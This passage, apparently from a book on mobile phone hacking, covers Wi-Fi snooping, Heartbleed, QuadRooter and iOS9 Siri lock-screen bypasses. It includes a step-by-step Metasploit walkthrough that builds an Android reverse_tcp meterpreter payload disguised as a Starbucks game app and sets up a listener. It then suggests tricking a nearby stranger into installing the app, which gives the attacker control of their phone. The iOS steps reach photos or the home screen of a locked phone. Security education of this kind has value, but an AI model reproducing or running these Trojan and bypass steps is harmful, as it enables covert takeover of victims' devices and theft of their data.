    internet.  They run a packet capture program and steal online banking information
    in real time while the victims thinks nothing is wrong.  Security minded individuals
    should always remember that open Wi-Fi hotspots are dangerous, and they should
    only ever be connected to for simple browsing or with a VPN running. 


    Social engineering plays a large part in mobile hacking as well.  Phone users
    usually forget that phones can get viruses and malware just as PCs can, so the
    user is often off-guard and willing to click links and download Trojan horses
    when browsing from their phone.  The following demonstration (courtesy of http://wonderhowto.com)
    takes advantage of an Android device on the same network (we’re in a Starbucks)
    and gives control to the hacker. 


    1.  Start a laptop with Kali Linux and the metasploit application installed.


    2.  Find out your IP address with ifconfig in a terminal.


    3.  Type this command- msfpayload android/meterpreter/reverse_tcp LHOST=(your
    IP) LPORT=8080 R > ~/Desktop/starbucksgames.apk which will create an application
    on the desktop that contains the exploit.


    4.  Type msfconsole to start metasploit’s console.


    5.  In the new console, type use exploit/multi/handler


    6.  Then type set payload android/meterpreter/reverse_tcp


    7.  set lhost (Your IP)


    8.  set lport 8080


    9.  Now you’ll need to deliver the exploit to your victim.  You could come up
    to them and ask “hey, have you tried Starbuck’s free game app for Android?  It’s
    pretty fun”.  With their permission, you could email them the application.  When
    they download and start it on their phone, return to your laptop and type exploit
    into the metasploit console.  The two devices will communicate and you will be
    given control over parts of the phone.


    The lesson learned is to never install any app that seems strange or comes from
    an irreputable source.  Later in the book, especially when talking about jailbreaking
    and rooting, we will install lots of “unverified” applications.  Ultimately there
    is no real way to know if we are installing a legitimate app or a Trojan horse
    like above.  When it comes to unofficial applications, you must trust your security
    instincts and only install from trusted sources. 


    Heartbleed is a famous 2014 OpenSSL bug that affected half a million web servers
    and also hit nearly 50 million Android devices.  The vulnerability allowed hackers
    to read data stored in memory such as passwords, encryption keys, and usernames
    by overflowing the buffer of TLS encryption.  So massive was the impact that devices
    everywhere needed emergency patches to protect themselves.  OpenSSL resolved the
    vulnerability as quickly as possible, and Android vendors issued an update that
    patched the problem.


    QuadRooter is an emerging vulnerability detected in Qualcomm chipsets for Android
    devices.  Through a disguised malicious app, a hacker can gain all device permissions
    without even requesting them.  Currently it is estimated that 900 million Android
    devices are vulnerable and at the time of writing not all carriers have released
    patches to remedy the issue.  Staying safe from QuadRooter means updating as soon
    as patches are released and to refrain from installing suspicious applications.


    Not just Android is affected by hackers, for the iPhone 6 and 6S running iOS9
    versions under 9.3.1 can have their pictures rifled through even if there is a
    passcode or fingerprint enabled.  Here is the process.  Follow along to see if
    your phone is vulnerable.


    1.  Hold the home button to start Siri.


    2.  Say “Search twitter”.


    3.  Siri will ask what to search for, respond with “@yahoo.com”, at “@att.net”,
    “@gmail.com”, or any other email suffix. 


    4.  Siri will display relevant results, so find a full email address among them. 
    Press firmly on the address (3D touch) and then press “add new contact”. 


    5.  By then “adding a photo” to our new “contact”, we have access to the entire
    picture library.


    This is reminiscent of an earlier iOS9 bug that could totally unlock a phone without
    a passcode.  You can do this hack on unupdated iOS9.


    1.  Hold the home button to start Siri.


    2.  Say “remind me”.


    3.  Say anything.


    4.  Click on the reminder that Siri creates.


    5.  Reminders will launch, long press the one you just created and click “share”.


    6.  Tap the messages app.


    7.  Enter any name, then tap on the name to create a new contact.


    8.  Tap choose photo, and you can then press the home button to go to the home
    screen while unlocked.


    Most vulnerabilities such as the two mentioned are patched almost as soon as they
    are discovered, which is why they will not work on an updated iOS9. 


    Finally, there is one final tactic that a hacker can use to break into a phone
    if they have physical possession of it.  If a hacker really wants to gain access
    to a mobile device, they can do so at the cost of deleting all data.  Through
    a factory reset, a hacker will erase absolutely everything on the device including
    the password and encryption, but they will be able to use the device or sell it
    to somebody else. '
